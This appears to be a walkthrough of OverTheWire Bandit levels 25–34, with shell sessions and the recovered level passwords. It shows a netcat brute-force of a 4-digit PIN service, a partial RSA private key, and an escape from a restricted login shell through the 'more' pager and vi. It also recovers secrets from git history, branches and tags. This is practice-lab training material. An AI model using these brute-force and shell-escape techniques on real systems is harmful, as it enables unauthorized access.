# Level 25

```sh
# password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
~$ ssh bandit24@bandit.labs.overthewire.org -p 2220

bandit24@bandit:~$ CURRENT_PASSWORD=`cat /etc/bandit_pass/bandit24`
bandit24@bandit:~$ for i in {0000..9999}; do echo $CURRENT_PASSWORD $i >> /tmp/bandit24-brute-force.dic; done

bandit24@bandit:~$ for i in {0000..9999}; do echo $CURRENT_PASSWORD $i >> /tmp/bandit24-brute-force.dic; done

bandit24@bandit:~$ cat /tmp/bandit24-brute-force.dic | nc localhost 30002
# <truncated>
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

Challenge: https://overthewire.org/wargames/bandit/bandit25.html

# Level 26

```sh
# password: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
~$ ssh bandit25@bandit.labs.overthewire.org -p 2220

bandit25@bandit:~$ cat bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
# <truncated>
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----

bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
exec more ~/text.txt
exit 0

# Resize the window to exploit "more" command (make it small enough si that you can navigate in interactive mode) 

# Download the private key and use it to connect to the server with bandit26 account
~$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey.private

# When connected start "vi" by pressing the letter "v"
# Once in "vi", you can escape and start a shell by executing:
:set shell=/bin/bash
:shell

bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```

Challenge: https://overthewire.org/wargames/bandit/bandit26.html

# Level 27

```sh
# Using the previous exploit to gain a shell (in Level 26):
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

Challenge: https://overthewire.org/wargames/bandit/bandit27.html

# Level 28

```sh
# git password: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
~$ git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo

~$ cat repo/README
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
```

Challenge: https://overthewire.org/wargames/bandit/bandit28.html

# Level 29

```sh
# git password: AVanL161y9rsbcJIsFHuw35rjaOM19nR
~$ git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
~$ cd repo/

~$ git log README.md
commit 43032edb2fb868dea2ceda9cb3882b2c336c09ec (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 1 06:30:25 2022 +0000
    fix info leak
commit bdf3099fb1fb05faa29e80ea79d9db1e29d6c9b9
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 1 06:30:25 2022 +0000
    add missing data
commit 43d032b360b700e881e490fbbd2eee9eccd7919e
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Sep 1 06:30:24 2022 +0000
    initial commit of README.md

~$ git diff 43032edb2fb868dea2ceda9cb3882b2c336c09ec bdf3099fb1fb05faa29e80ea79d9db1e29d6c9b9
diff --git a/README.md b/README.md
index 5c6457b..b302105 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: xxxxxxxxxx
+- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
```

Challenge: https://overthewire.org/wargames/bandit/bandit29.html

# Level 30

```sh
# git password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
~$ git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
~$ cd repo/

~$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev

~$ git checkout origin/dev

~$ cat README.md
# <truncated>
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
```

Challenge: https://overthewire.org/wargames/bandit/bandit30.html

# Level 31

```sh
# git password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
~$ git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
~$ cd repo/

~$ git tag -l
secret

~$ $ git show secret
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
```

Challenge: https://overthewire.org/wargames/bandit/bandit31.html

# Level 32

```sh
# git password: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
~$ git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
~$ cd repo/

~$ cat README.md
This time your task is to push a file to the remote repository.
Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

~$ echo May I come in? > key.txt
~$ git add key.txt -f
~$ git commit -m "Add a file"
~$ git push
# <truncated>
remote: Well done! Here is the password for the next level:
remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
# <truncated>
```

Challenge: https://overthewire.org/wargames/bandit/bandit32.html

# Level 33

```sh
# password: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
~$ ssh bandit32@bandit.labs.overthewire.org -p 2220

>> bash
sh: 1: BASH: not found
>> $0
$ cat /etc/bandit_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
```

Challenge: https://overthewire.org/wargames/bandit/bandit33.html

# Level 34

```sh
# password: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
~$ ssh bandit33@bandit.labs.overthewire.org -p 2220

bandit33@bandit:~$ cat README.txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
```

Challenge: https://overthewire.org/wargames/bandit/bandit34.html
